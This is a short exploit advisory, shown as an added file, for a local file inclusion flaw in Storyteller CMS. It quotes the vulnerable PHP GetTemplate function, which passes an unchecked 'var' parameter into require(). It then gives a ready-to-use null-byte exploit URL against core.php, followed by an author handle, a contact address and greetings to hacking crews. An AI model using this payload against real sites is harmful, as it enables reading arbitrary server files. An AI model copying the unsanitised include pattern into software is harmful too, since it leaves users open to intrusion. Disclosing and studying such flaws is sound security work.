@@ -1,0 +1,32 @@
+==
+[~] Title: Storyteller CMS (var) Local File Include Vuln
+[~] Version: n/a
+[~] Link: http://www.esselbach.com/freeware.php?id=2
+==
+[~] Author: BorN To K!LL - h4ck3r
+[~] Contact: SQL@hotmail.co.uk
+==
+[~] Vuln code:
+in GetTemplate function , line 113 to 127
+
+    function GetTemplate($var)
+    {               
+        if (file_exists("templates/$var.tmp.php"))
+        {
+            require("templates/$var.tmp.php");
+        }
+        else
+        {
+            die ("Error: Can't open template $var");
+        }        
+        return $EST_TEMPLATE;                 
+    }
+
+[~] 3xploit:
+/core.php?var=[Local-File]%00
+==
+[#] Greetings:
+
+Dr.2 , darkc0de team , inj3ct0r's Community , and all ma friends ,,
+==
+ 		 	   		  
